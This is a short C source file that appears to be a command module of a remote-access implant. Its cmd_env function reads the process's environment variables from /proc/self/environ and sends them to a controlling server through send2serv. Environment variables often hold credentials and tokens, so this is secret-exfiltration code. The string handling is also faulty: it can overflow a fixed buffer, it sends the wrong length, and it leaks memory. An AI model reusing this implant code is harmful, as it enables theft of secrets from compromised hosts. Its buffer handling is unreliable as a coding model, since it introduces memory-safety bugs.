#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <liburing.h>
#include "functions/send/send2serv.h"
#include "functions/read_file/read_file.h"


void cmd_env(struct io_uring *ring, int sockfd, const char *uuid, const char *arg) { //arg is unused. Just a dummy place holder. 
    size_t buffer_size = 8192; // Start with 8KB
    char *output_buffer = malloc(buffer_size);
    int total = read_file(ring, "/proc/self/environ", output_buffer, buffer_size);
    if (total < 0) {
        char error_msg[256];
        snprintf(error_msg, sizeof(error_msg), "Unable to read environmental variables at /proc/self/environ...\n");
        send2serv(uuid, error_msg, strlen(error_msg));
        return;
    }

    char *current_ptr = output_buffer;
    char final_string[8192] = "";

    while (*current_ptr) {
        strcat(final_string, current_ptr);
        strcat(final_string, "\n");
        current_ptr += strlen(current_ptr) + 1;
    }

    send2serv(uuid, final_string, buffer_size);
}